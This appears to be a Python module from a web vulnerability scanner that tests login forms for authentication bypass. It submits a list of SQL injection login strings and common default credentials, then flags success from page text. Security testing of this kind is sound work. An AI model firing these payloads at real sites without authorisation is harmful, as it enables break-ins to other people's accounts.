"""Authentication Bypass Scanner - OWASP A07:2021."""
import re
from core.base_scanner import BaseScanner
from core.logger import vuln, debug

AUTH_PAYLOADS = [
    # Username field payloads
    ("admin'--", "anything"),
    ("admin'#", "anything"),
    ("admin'/*", "anything"),
    ("' OR 1=1--", "anything"),
    ("' OR '1'='1'--", "anything"),
    ("admin", "' OR '1'='1"),
    ("admin", "' OR 1=1--"),
    ("admin", "anything' OR 'x'='x"),
    # Default credentials
    ("admin", "admin"),
    ("admin", "password"),
    ("admin", "admin123"),
    ("admin", "1234"),
    ("root", "root"),
    ("administrator", "administrator"),
    ("test", "test"),
    ("guest", "guest"),
    ("admin", ""),
    ("", ""),
    ("admin", "pass"),
    ("admin@admin.com", "admin"),
]

SUCCESS_SIGNS = re.compile(
    r"welcome|dashboard|logged.?in|logout|your account|profile|"
    r"hello,?\s+\w+|sign out|my account|home",
    re.IGNORECASE
)
FAIL_SIGNS = re.compile(
    r"invalid|incorrect|wrong|failed|error|denied|unauthorized|"
    r"bad credentials|login again",
    re.IGNORECASE
)

LOGIN_FORM_WORDS = ["login", "signin", "sign-in", "authenticate", "logon", "log-in"]


class AuthBypassScanner(BaseScanner):
    MODULE_NAME = "auth_bypass"
    OWASP_CATEGORY = "A07:2021 - Identification and Authentication Failures"

    def scan(self, urls: list) -> list:
        findings = []
        tested = set()
        for url in urls:
            # Only test login-like pages
            if not any(w in url.lower() for w in LOGIN_FORM_WORDS + ["user", "account", "session"]):
                # Still check forms on all pages
                pass
            forms = self.get_forms(url)
            for form in forms:
                # Identify login forms
                fields = list(form["inputs"].keys())
                has_user = any("user" in f.lower() or "email" in f.lower() or "name" in f.lower()
                               for f in fields)
                has_pass = any("pass" in f.lower() or "pwd" in f.lower() or "secret" in f.lower()
                               for f in fields)
                if not (has_user and has_pass):
                    continue

                key = f"authform:{form['url']}"
                if key in tested:
                    continue
                tested.add(key)

                user_field = next((f for f in fields if "user" in f.lower() or "email" in f.lower() or "name" in f.lower()), fields[0])
                pass_field = next((f for f in fields if "pass" in f.lower() or "pwd" in f.lower()), fields[-1])

                debug(f"  Testing auth form: {form['url']} [user={user_field}, pass={pass_field}]")

                # Get baseline (empty creds)
                baseline = self.session.post(form["url"], data={"username": "lv188_nonexistent", "password": "lv188_wrong"})
                baseline_text = baseline.text if baseline else ""

                for username, password in AUTH_PAYLOADS:
                    injected = dict(form["inputs"])
                    injected[user_field] = username
                    injected[pass_field] = password
                    resp = self.session.post(form["url"], data=injected)
                    if not resp:
                        continue

                    success = SUCCESS_SIGNS.search(resp.text)
                    fail = FAIL_SIGNS.search(resp.text)

                    if success and not fail:
                        payload_str = f"{user_field}={username} | {pass_field}={password}"
                        # Check it's not just the same as baseline
                        if baseline and abs(len(resp.text) - len(baseline_text)) > 50:
                            is_sqli = any(c in username for c in ["'", "--", "OR", "/*"])
                            f = self.make_finding(
                                url=form["url"],
                                param=f"{user_field}/{pass_field}",
                                payload=payload_str,
                                evidence=SUCCESS_SIGNS.search(resp.text).group(0),
                                severity="CRITICAL" if is_sqli else "HIGH",
                                description=(
                                    "SQLi-based authentication bypass" if is_sqli
                                    else f"Default/weak credentials accepted: {username}:{password}"
                                ),
                                remediation=(
                                    "Use parameterized queries. Enforce strong password policy. "
                                    "Implement account lockout after failed attempts."
                                ),
                            )
                            vuln(f"  [VULN] Auth Bypass @ {form['url']} | {payload_str}")
                            findings.append(f)
                            break
        return findings
